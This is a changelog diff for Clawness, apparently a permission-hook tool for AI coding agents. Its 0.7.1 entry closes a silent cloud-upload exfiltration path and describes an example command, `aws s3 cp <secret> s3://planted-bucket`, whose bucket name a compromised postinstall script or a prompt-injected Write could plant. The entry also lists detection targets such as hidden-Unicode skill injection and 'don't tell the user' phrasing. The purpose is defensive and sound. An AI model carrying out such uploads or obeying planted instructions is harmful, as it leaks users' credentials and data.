@@ -5,6 +5,23 @@ All notable changes to Clawness will be documented in this file.
 Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
 Versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [0.7.1] - 2026-07-04
+
+### Security
+- **Cloud-storage uploads no longer trust a bucket named in your source.** 0.7.0
+  treated a bucket the repo referenced (IaC/config) as endogenous and let the upload
+  through **silently**. But project source is forgeable — a compromised dependency's
+  `postinstall`, or a prompt-injected `Write`, can plant a bucket name — so
+  "known bucket → allow" was a silent exfil-laundering path
+  (`aws s3 cp <secret> s3://planted-bucket`). Every cloud upload (`aws s3 cp/sync/mv`,
+  `gsutil`, `az storage blob upload`) now **asks once per bucket**, regardless of
+  provenance. The provenance scan for cloud targets is dropped entirely — it can't
+  safely buy silence, and skipping it also saves the ~140 ms bucket walk. Net
+  invariant: provenance can only ever move a decision *toward* a prompt, never toward
+  silence. Motivated by the 2025–2026 `nx` / Shai-Hulud npm worms, whose postinstall
+  scripts harvested cloud keys and exfiltrated data from victims' S3 buckets.
+  Regression test: `test_cloud_upload_to_bucket_in_source_still_asks_no_silent_allow`.
+
 ## [0.7.0] - 2026-07-03
 
 ### Added
@@ -35,7 +52,7 @@ Versioning follows [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
   - Cloud-storage uploads (`aws s3 cp/sync/mv`, `gsutil`, `az storage blob upload`)
     are provenance-tiered: a bucket the repo already references (IaC/config) is the
     routine deploy path and stays silent; an unrecognized bucket asks once per bucket.
-    Downloads (cloud → local) are never flagged.
+    Downloads (cloud → local) are never flagged. *(Hardened in 0.7.1 — see below.)*
 - **Trust ledger**: zero-width/Unicode-tag steganography detection (a leading
   skill-injection hiding channel, previously unscanned), concealment phrasing
   ("don't tell the user", "secretly"), webhook/paste-bin exfil hosts, and
